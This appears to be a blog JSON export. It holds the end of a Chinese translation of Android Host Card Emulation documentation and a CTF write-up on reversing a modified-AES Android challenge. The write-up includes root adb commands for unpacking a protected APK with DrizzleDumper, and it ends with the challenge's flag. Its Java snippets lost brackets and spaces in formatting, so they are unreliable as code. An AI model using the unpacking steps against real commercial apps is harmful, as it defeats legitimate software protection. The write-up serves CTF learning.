APDU，OS将其解析为不同的服务;\n2.  NFC读卡器和您的设备之间的NFC链接被破坏。\n\n在这两种情况下，你的类的 [onDeactivated()](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#onDeactivated(int))实现都是通过一个参数来调用的，这个参数指出了两者中的哪一个发生了。\n\n如果您正在使用现有的读卡器基础架构，则需要实现读卡器在您的HCE服务中期望的现有应用程序级协议。\n\n如果您正在部署您控制的新读卡器基础架构，则可以定义自己的协议和APDU序列。通常，尝试限制APDU数量和需要交换的数据大小：这样可以确保用户只需将设备通过NFC读取器持续一段时间即可。合理的上限约为1KB的数据，通常可以在**300ms**内交换。\n\n### 5.3 服务清单声明和AID注册\n\n您的服务必须像往常一样在清单中声明，但还必须在服务声明中添加一些附加件。\n\n首先，为了告诉平台它是一个实现[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)接口的HCE服务 ，你的服务声明必须包含一个[SERVICE_INTERFACE](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#SERVICE_INTERFACE)动作的[Intent Filter](https://blog.csdn.net/mynameishuangshuai/article/details/51673273)。\n\n另外，为了告知平台哪个AIDs组被这个服务请求，一个[SERVICE_META_DATA](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html#SERVICE_META_DATA)`<meta-data>`标签必须包含在服务的声明中，指向一个XML资源和关于HCE服务的附加信息。\n\n最后，您必须将该`android:exported`属性设置为true，并且`\"android.permission.BIND_NFC_SERVICE\"`在服务声明中要求权限。前者确保服务可以被外部应用程序绑定。后者然后强制只有拥有该`\"android.permission.BIND_NFC_SERVICE\"`权限的外部应用程序 才能绑定到您的服务。既然`\"android.permission.BIND_NFC_SERVICE\"`是一个系统权限，这有效地强制只有Android OS可以绑定到你的服务。\n\n这是一个[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)清单声明的例子：\n\n```xml\n<service android:name=\".MyHostApduService\" android:exported=\"true\"\n         android:permission=\"android.permission.BIND_NFC_SERVICE\">\n    <intent-filter>\n        <action android:name=\"android.nfc.cardemulation.action.HOST_APDU_SERVICE\"/>\n    </intent-filter>\n    <meta-data android:name=\"android.nfc.cardemulation.host_apdu_service\"\n               android:resource=\"@xml/apduservice\"/>\n</service>\n```\n\n\n\n这个元数据标签指向一个`apduservice.xml`文件。下面显示了具有包含两个专有AID的单个AID组声明的此类文件的示例：\n\n```xml\n<host-apdu-service xmlns:android=\"http://schemas.android.com/apk/res/android\"\n           android:description=\"@string/servicedesc\"\n           android:requireDeviceUnlock=\"false\">\n    <aid-group android:description=\"@string/aiddescription\"\n               android:category=\"other\">\n        <aid-filter android:name=\"F0010203040506\"/>\n        <aid-filter android:name=\"F0394148148100\"/>\n    </aid-group>\n</host-apdu-service>\n```\n\n该`<host-apdu-service>`标签需要包含一个`<android:description>` 属性，该属性包含可能在UI中显示的用户友好的服务描述。该`requireDeviceUnlock`属性可用于指定在调用此服务来处理APDU之前必须先解锁设备。\n\n在`<host-apdu-service>`必须包含一个或多个`<aid-group>`标签。每个 `<aid-group>`标签都需要：\n\n*   包含一个`android:description`属性，其中包含用户友好的AID组描述，适合在UI中显示。\n*   将其`android:category`属性设置为指示AID组所属的类别，例如[CATEGORY_PAYMENT](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_PAYMENT) or 定义的字符串常[CATEGORY_OTHER](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_OTHER)。\n*   每个标签`<aid-group>`必须包含一个或多个 `<aid-filter>`标签，每个标签包含一个AID。AID必须以十六进制格式指定，并且包含偶数个字符。\n\n最后，您的应用程序还需要拥有[NFC](https://developer.android.com/reference/android/Manifest.permission.html#NFC)可以注册为HCE服务的 权限。\n\n## 0x06 AID冲突解决\n\n多个[HostApduService](https://developer.android.com/reference/android/nfc/cardemulation/HostApduService.html)组件可以安装在单个设备上，并且可以由多个服务注册相同的AID。Android平台根据AID属于哪个类别来解决AID冲突。每个类别可能有不同的冲突解决策略。\n\n例如，对于某些类别（如付款），用户可能能够在Android设置UI中选择默认服务。对于其他类别，策略可能总是要求用户在冲突情况下调用哪个服务。要查询特定类别的冲突解决策略，请参阅 [getSelectionModeForCategory()](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#getSelectionModeForCategory(java.lang.String))。\n\n### 6.1 检查您的服务是否为默认设置\n\n应用程序可以使用[isDefaultServiceForCategory(ComponentName, String)](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#isDefaultServiceForCategory(android.content.ComponentName, java.lang.String))API 检查其HCE服务是否是某个类别的默认服务。\n\n如果您的服务不是默认设置，则可以请求将其设置为默认设置。看[ACTION_CHANGE_DEFAULT](https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#ACTION_CHANGE_DEFAULT)。\n\n## 0x07 付款应用\n\nAndroid会将AID组为“payment”的类别，声明的HCE服务视为支付应用程序。Android 4.4版本包含一个名为“tap＆pay”的top-level设置菜单条目，它列举了所有这些支付应用程序。在此设置菜单中，用户可以选择在点按付款终端时将调用的默认支付应用程序。\n\n### 7.1 支付应用程序所需的resource\n\n为了提供更具视觉吸引力的用户体验，HCE支付应用程序需要为其服务提供额外的resource：所谓的服务标记。\n\n这个asset的大小应该是260x96 dp，并且可以在元数据(meta-data)XML文件中通过添加指向drawable resource`android:apduServiceBanner`的`<host-apdu-service>`标签的属性来指定 。一个例子如下所示：\n```xml\n<host-apdu-service xmlns:android=\"http://schemas.android.com/apk/res/android\"\n        android:description=\"@string/servicedesc\"\n        android:requireDeviceUnlock=\"false\"\n        android:apduServiceBanner=\"@drawable/my_banner\">\n    <aid-group android:description=\"@string/aiddescription\"\n               android:category=\"payment\">\n        <aid-filter android:name=\"F0010203040506\"/>\n        <aid-filter android:name=\"F0394148148100\"/>\n    </aid-group>\n</host-apdu-service>\n```\n\n## 0x08 屏幕关闭和锁屏行为\n\n当设备的屏幕关闭时，当前的Android实施将NFC控制器和应用程序处理器完全关闭。因此，当屏幕关闭时，HCE服务将无法工作。\n\n然而，HCE服务可以从锁定屏幕中起作用：这由HCE服务标记中的`android:requireDeviceUnlock`属性控制`<host-apdu-service>`。默认情况下，不需要设备解锁，即使设备被锁定，您的服务也会被调用。\n\n如果您将`android:requireDeviceUnlock`HCE服务的属性设置为“true”，Android会提示用户在您靠近NFC读卡器时解锁设备，NFC读卡器会选择已解析为您的服务的AID。解锁后，Android会显示一个对话框，提示用户再次点击以完成交易。这是必要的，因为用户可能已经将设备从NFC读卡器移开以便解锁它。\n\n## 0x09 与SE卡共存\n\n本部分对于已经部署依赖SE进行卡模拟的应用程序的开发人员很感兴趣。Android的HCE实现旨在与其他实现卡仿真的方法并行工作，包括使用SE。\n\n>**注意：** Android不提供用于直接与SE进行通信的API。\n\n这种共存基于一种称为“AID路由”的原则：NFC控制器保留一个由（有限）路由规则列表组成的路由表。每个路由规则都包含一个AID和一个目的地。目标可以是主机CPU（Android应用程序正在运行的地方），也可以是连接的SE。\n\n当NFC读卡器发送具有“SELECT AID”的APDU时，NFC控制器解析它并检查AID是否与其路由表中的任何AID匹配。如果匹配，那么APDU和其后的所有APDU将被发送到与AID相关联的目的地，直到收到另一个“SELECT AID” APDU或NFC链路断开。\n\n> **注意：** 虽然ISO / IEC 7816-4也定义了“部分匹配”的概念，但目前Android HCE设备不支持此功能。\n\n图4说明了这种架构。\n\n<center>![图4.使用SE和主机卡模拟的Android操作](https://github.com/killshadow/killshadow.github.io/blob/master/image/002/4.png?raw=true)</center>\n\nNFC控制器通常还包含APDU的默认路由。在路由表中找不到AID时，将使用默认路由。尽管此设置可能因设备而异，但Android设备需要确保您的应用注册的AID已正确路由到主机。\n\n实现HCE服务或使用SE的Android应用程序不必担心配置路由表 - 这是由Android自动处理的。Android只需要知道哪些AID可以由HCE服务处理，哪些可以由SE处理。基于哪些服务已安装，以及哪些用户已配置为首选服务，路由表会自动配置。\n\n我们已经介绍了如何声明HCE服务的AID。以下部分说明如何为使用SE进行卡模拟的应用程序声明AID。\n\n### 9.1 Secure Element AID注册\n\n使用SE进行卡模拟的应用程序可以在其清单中声明所谓的“关闭主机服务”。这种服务的声明几乎与宣布HCE服务相同。以下情况例外：\n\n* 意图过滤器中使用的操作必须设置为 [SERVICE_INTERFACE](https://developer.android.com/reference/android/nfc/cardemulation/OffHostApduService.html#SERVICE_INTERFACE)。\n\n* 元数据名称属性必须设置为 [SERVICE_META_DATA](https://developer.android.com/reference/android/nfc/cardemulation/OffHostApduService.html#SERVICE_META_DATA)。\n\n* 元数据XML文件必须使用`<offhost-apdu-service>`根标签。\n\n    ```xml\n    <service android:name=\".MyOffHostApduService\" android:exported=\"true\"\n             android:permission=\"android.permission.BIND_NFC_SERVICE\">\n        <intent-filter>\n            <action android:name=\"android.nfc.cardemulation.action.OFF_HOST_APDU_SERVICE\"/>\n        </intent-filter>\n        <meta-data android:name=\"android.nfc.cardemulation.off_host_apdu_service\"\n                   android:resource=\"@xml/apduservice\"/>\n    </service>\n    ```\n\n相应`apduservice.xml`文件注册两个AID 的示例：\n\n```xml\n<offhost-apdu-service xmlns:android=\"http://schemas.android.com/apk/res/android\"\n           android:description=\"@string/servicedesc\">\n    <aid-group android:description=\"@string/subscription\" android:category=\"other\">\n        <aid-filter android:name=\"F0010203040506\"/>\n        <aid-filter android:name=\"F0394148148100\"/>\n    </aid-group>\n</offhost-apdu-service>\n```\n\n该`android:requireDeviceUnlock`属性不适用于脱离主机服务，因为主机CPU不参与事务，因此无法阻止SE在设备锁定时执行事务。\n\n该`android:apduServiceBanner`属性必须用于作为支付应用程序的关闭主机服务，以便作为默认支付应用程序进行选择。\n\n### 9.2 关闭主机服务调用\n\nAndroid本身永远不会启动或绑定到声明为“脱离主机”的服务。这是因为实际交易由SE执行，而不是由Android服务本身执行。服务声明仅允许应用程序注册安全元件(Secure Element)上存在的AID。\n\n## 0x0A HCE和安全\n\nHCE体系结构本身提供了一个核心安全性：因为您的服务受到[BIND_NFC_SERVICE](https://developer.android.com/reference/android/Manifest.permission.html#BIND_NFC_SERVICE)系统权限的保护，所以只有操作系统可以绑定到您的服务并与之通信。这可以确保您收到的任何APDU实际上都是OS从NFC控制器接收到的APDU，并且您发回的任何APDU只会发送到操作系统，而操作系统会直接将APDU转发给NFC控制器。\n\n剩下的核心部分就是您获取应用程序发送给NFC读卡器的数据的位置。这在HCE设计中有意解耦：它不关心数据来自何处，它只是确保将其安全地传送到NFC控制器并传送到NFC读取器。\n\n为了安全地存储和检索您希望从HCE服务发送的数据，例如，您可以依靠Android应用程序沙箱，将应用程序的数据与其他应用程序隔离。有关Android安全性的更多详细信息，请阅读 [安全提示](https://developer.android.com/training/articles/security-tips.html)。\n\n## 0x0B 协议参数和细节\n\n这部分内容对于希望了解HCE设备在NFC协议的防冲突和激活阶段使用何种协议参数的开发人员很感兴趣。这允许构建与Android HCE设备兼容的读卡器基础结构。\n\n### 11.1 Nfc-A（ISO / IEC 14443 A型）协议防冲突和激活\n\n作为Nfc-A协议激活的一部分，交换多个帧。\n\n在交换的第一部分，HCE设备将呈现其UID; HCE设备应该被假定为具有随机的UID。这意味着在每个抽头中，呈现给读卡器的UID将是随机生成的UID。因此，NFC读卡器不应依赖HCE设备的UID作为身份验证或身份验证的一种形式。\n\nNFC读取器可以随后通过发送SEL_REQ命令来选择HCE设备。HCE设备的SEL_RES响应将至少设置第6位（0x20），表示设备支持ISO-DEP。注意，SEL_RES中的其他位也可以被设置，表示例如对NFC-DEP（p2p）协议的支持。由于可以设置其他位，所以想要与HCE设备交互的读者应该明确检查第6位，并且<stront style=\"box-sizing: inherit;\">不要将完整的SEL_RES与值0x20进行比较。</stront>\n\n### 11.2 ISO-DEP激活\n\nNfc-A协议激活后，NFC读取器启动ISO-DEP协议激活。它发送一个“RATS”（请求选择应答）命令。RATS响应（ATS）完全由NFC控制器生成，不能由HCE服务配置。然而，HCE实现需要满足NFC论坛对ATS响应的要求，因此NFC读卡器可以根据NFC论坛对任何HCE设备的要求设置这些参数。\n\n以下部分提供了有关NFC控制器在HCE设备上提供的ATS响应的各个字节的更多详细信息：\n\n*   TL：ATS响应的长度。不得指示大于20个字节的长度。\n*   T0：必须在所有HCE设备上设置位5,6和7，指示TA（1），TB（1）和TC（1）包含在ATS响应中。比特1至4指示FSCI，编码最大帧大小。在HCE设备上，FSCI的值必须在0h和8h之间。\n*   T（A）1：定义读卡器和模拟器之间的比特率，以及它们是否可以是不对称的。HCE设备没有比特率要求或保证。\n*   T（B）1：位1至4指示启动帧保护时间整数（SFGI）。在HCE设备上，SFGI必须<= 8h。位5到8指示帧等待时间整数（FWI）并编码帧等待时间（FWT）。在HCE设备上，FWI必须<= 8h。\n*   T（C）1：位5表示支持“高级协议功能”。HCE设备可能支持或不支持“高级协议功能”。位2表示对DID的支持。HCE设备可能支持DID，也可能不支持DID。位1表示支持NAD。HCE设备不能支持NAD并将位1设置为零。\n*   历史字节：HCE设备最多可以返回15个历史字节。愿意与HCE服务交互的NFC读卡器不应该假设历史字节的内容或它们的存在。\n\n请注意，许多HCE设备可能符合EMVCo联合的支付网络在其“非接触式通信协议”规范中指定的协议要求。尤其是：\n\n*   T0中的FSCI必须在2小时和8小时之间。\n*   T（A）1必须设置为0x80，表示仅支持106 kbit / s比特率，并且不支持读卡器和仿真器之间的非对称比特率。\n*   T（B）1中的FWI必须<= 7h。\n\n### 11.3 APDU数据交换\n\n如前所述，HCE实现仅支持单个逻辑通道。尝试在不同的逻辑通道上选择应用程序将不适用于HCE设备。\n\n## 0x0C 后记\n\n本文[翻译自](https://developer.android.com/guide/topics/connectivity/nfc/hce)谷歌开发者文档，已由本人仔细校对。如有错误，请联系我，以便修改。","tags":[{"name":"Android Developer","slug":"Android-Developer","permalink":"http://www.killshadow.xyz/tags/Android-Developer/"}]},{"title":"某AES变种题分析","date":"2018-05-09T16:00:00.000Z","path":"2018/05/10/某aes变种题分析/","raw":"---\ntitle: 某AES变种题分析\ndate: 2018-5-10\ncategories:\ntoc: ture\ntags:\n\t- Mobile Security\n\t- Reverse\n\t- CTF\ncomments: true\n---\n[源码](https://github.com/killshadow/CTFTopic/tree/master/reverse/Android/GAESAndroid)\n### 一、脱壳\n\n1.使用jeb打开下载的apk文件，发现代码十分混乱，很明显是加固混淆过的代码，所以需要先将其脱壳。\n<!-- more -->\n2.现在网络上的免费加固服务基本都是第一代，第二代加固，手动脱壳网络上也有很多的教程，这里使用一个现成的工具进行脱壳。\n3.DrizzleDumper自动脱壳工具：\n```powershell\n   cd xxxxx/drizzleDumper\n   adb push drizzleDumper /data/local/tmp\n   adb shell chmod 777 /data/local/tmp/drizzleDumper\n   adb shell\n   su\n   ./data/local/tmp/drizzleDumper com.example.zhang.gaesandroid 3\n```\n   脱下来的dex文件默认文件名为`com.example.zhang.gaesandroid_dumped_88.dex`，导出发现脱壳完毕。\n\n### 二、逻辑分析/算法分析--Decode\n1.脱壳后，将apk文件反编译，可以看到`MainActivity`中主要逻辑为：\n   明文密钥:\n   `String key=\"This is a AES-like encryptionalgorithm....Our challenge is to find the plain text of this encrypt messagewith th fixed key. \";`\n   输出密文:\n   `String encryptedText=\"eaZwtl5nsHW3ledvoZCdFla5yG13p2Txfq3AN7LEX7s2uK+v7x2Wsz/7jbe0G6R2\";`\n   寻找`plainText`满足`encrypt(plainText,key)==encryptedText`\n   所以，解法为**阅读encrypt方法，写出其逆算法**.\n\n2.encrypt算法为AES算法，可以在资源文件中找到其流程图aes.png或者从网上搜索到流程，主要逻辑为：\n   将明文按16位进行切割（如果不足补0），对每一个16位，将其用类`LightState`进行操作，加上密钥后，调用LightState的方法获得16位密文，拼接在一起获得最终密文，然后base64输出，代码逻辑为：\n   ```java\n   LightState state=new LightState(inputBytes);\n   for(int round=0;round<=10;round++) {\n       byteroundKey[]=new byte[16];\n       for(int j=0;j<16;j++) {\n           roundKey[j]=keyBytes[round*16+j];\n           }\n       if(round==0){\n           state.addRoundKey(roundKey);\n       } \n       elseif(round<10) {\n           state.substitute();\n           state.shiftRows();\n           state.mixCloumns();\n           state.addRoundKey(roundKey);\n       } \n       else {\n           state.substitute();\n           state.shiftRows();\n           state.addRoundKey(roundKey);\n       }\n   }\n   ```\n\n3.因此，可以写出逆算法逻辑（或者查到揭秘逻辑）为：\n   ```java\n   State state=new State(inputBytes, true);\n   for(int round=0;round<=10;round++) {\n       byteroundKey[]=new byte[16];\n       for(intj=0;j<16;j++) {\n       roundKey[j]=keyBytes[(10-round)*16+j];\n       }\n       if(round==0){\n           state.addRoundKey(roundKey);\n       } \n       elseif(round<10) {\n           state.inverseShiftRows();\n           state.inverseSubstitute();\n           state.addRoundKey(roundKey);\n           state.inverseMixCloumns();\n       } \n       else {\n           state.inverseShiftRows();\n           state.inverseSubstitute();\n           state.addRoundKey(roundKey);\n       }\n   }\n   ```\n   所以问题转化为写出三个核心模块`shiftRows`，`mixCloumns`，`substitute`的逆算法`inverseShiftRows`，`inverseMixCloumns`，`inverseSubstitute`\n\n4.根据提示或者阅读`LightState`代码，`shiftRows`和AES完全一致，逆算法逻辑如下：\n   ```java\n   publicvoid inverseShiftRows() {\n       for(inti=0;i<4;i++) {\n           bytetemp[]=new byte[4];\n           for(intj=0;j<4;j++) {\n               temp[j]=_statesi;\n           }\n           for(intj=0;j<4;j++) {\n               _statesi=temp[(4+j-i)%4];\n           }\n       }\n   }\n   ```\n   `substitute`也没有做改变，其逻辑为对_states4每一个byte，做一个变换得到输出sbox(byte)，因此逆算法在于写出`inverseSbox`方法，这里有三种路径获得：\n   - 遍历sbox所有输入，得到所有输出，做成查找表即可\n\n   - 直接查找AES的S盒逆查找表（如<http://www.blogfshare.com/aes-rijndael.html>）\n\n   - `LightState`中有`inverseSbox`方法，可直接调用，最终写法为：\n\n     ```java\n     publicvoid inverseSubstitute() {\n          for(int i=0;i<4;i++) {\n             for(intj=0;j<4;j++) {\n                 *statesi=inverseSbox(*statesi);\n             }\n          }\n     }\n     ```\n\n5.`mixCloumns`做了改变，变化在于计算用于求模的多项式从`x8+x4+x3+x+1`变`x8+x4+x3+x^2+1`，但是逻辑没有改变，因此，正向逻辑为每一列左乘矩阵：\n   ```java\n   2,3,1,1\n   1,2,3,1\n   1,1,2,3\n   3,1,1,2\n   ```\n\n6.逆算法同样为左乘逆矩阵(矩阵值可以网上查到)：\n   ```java\n   e,b,d,9\n   9,e,b,d\n   d,9,e,b\n   b,d,9,e\n   ```\n\n7.所以需要写出修改后的乘法算法，在`LightState`中给出了没有改动多项式的乘法算法`multiply(inta, int b)`作为参考，可以仿照其样子写，需要改写的是两个多项式乘积后模原来的多项式这部分逻辑改成模新的多项式，逻辑如下：\n   ```java\n   publicstatic byte multiply_new(int a, int b) {\n       if(a<0){\n           a+=256;\n       }\n       if(b<0){\n       b+=256;\n       }\n       intvalues[]=new int[8];\n       inttemp=a;\n       for(inti=0;i<8;i++) {\n           values[i]=temp%2;\n           temp/=2;\n       }\n       intresults[]=new int[11];\n       if((b&0x08)>0){\n           for(inti=0;i<8;i++) {\n               if(values[i]>0){\n                   results[i+3]=(results[i+3]+1)%2;\n               }\n           }\n       }\n\n       if((b&0x04)>0){\n           for(inti=0;i<8;i++) {\n               if(values[i]>0){\n                   results[i+2]=(results[i+2]+1)%2;\n               }\n           }\n       }\n       if((b&0x02)>0){\n           for(inti=0;i<8;i++) {\n               if(values[i]>0){\n                 results[i+1]=(results[i+1]+1)%2;\n               }\n           }\n       }\n\n       if((b&0x01)>0){\n           for(inti=0;i<8;i++) {\n               if(values[i]>0){\n                   results[i]=(results[i]+1)%2;\n               }\n           }\n       }\n       if(results[10]>0){\n       results[6]=(results[6]+1)%2;\n       results[5]=(results[5]+1)%2;\n       results[4]=(results[4]+1)%2;\n       results[2]=(results[2]+1)%2;\n       }\n\n       if(results[9]>0){\n       results[5]=(results[5]+1)%2;\n       results[4]=(results[4]+1)%2;\n       results[3]=(results[3]+1)%2;\n       results[1]=(results[1]+1)%2;\n       }\n\n       if(results[8]>0){\n       results[4]=(results[4]+1)%2;\n       results[3]=(results[3]+1)%2;\n       results[2]=(results[2]+1)%2;\n       results[0]=(results[0]+1)%2;\n       }\n\n       return(byte) (results[7]*128+results[6]*64+results[5]*32+results[4]*16+results[3]*8+results[2]*4+results[1]*2+results[0]);\n   }\n   ```\n   主要修改在最后三个if，即模新的多项式。\n\n8.所以列混淆的逆算法可以写为：\n\n   ```java\n   publicvoid inverseMixCloumns() {\n       for(intj=0;j<4;j++) {\n           bytetemp[]=new byte[4];\n           for(int i=0;i<4;i++) {\n               temp[i]=_statesi;\n           }\n\n           _states0=add(multiply_new(temp[0],0xe), multiply_new(temp[1], 0xb), multiply_new(temp[2], 0xd),multiply_new(temp[3], 0x9));\n\n           _states1=add(multiply_new(temp[0],0x9), multiply_new(temp[1], 0xe), multiply_new(temp[2], 0xb),multiply_new(temp[3], 0xd));\n\n           _states2=add(multiply_new(temp[0],0xd), multiply_new(temp[1], 0x9), multiply_new(temp[2], 0xe),multiply_new(temp[3], 0xb));\n\n           _states3=add(multiply_new(temp[0],0xb), multiply_new(temp[1], 0xd), multiply_new(temp[2], 0x9),multiply_new(temp[3], 0xe));\n       }\n   }\n   ```\n\n9.至此三个逆算法完成，即可获得逆算法，最终flag为：\n   `flag{aes_is_the_best_encryption}`","tags":[{"name":"Mobile Security","slug":"Mobile-Security","permalink":"http://www.killshadow.xyz/tags/Mobile-Security/"},{"name":"Reverse","slug":"Reverse","permalink":"http://www.killshadow.xyz/tags/Reverse/"},{"name":"CTF","slug":"CTF","permalink":"http://www.killshadow.xyz/tags/CTF/"}]}]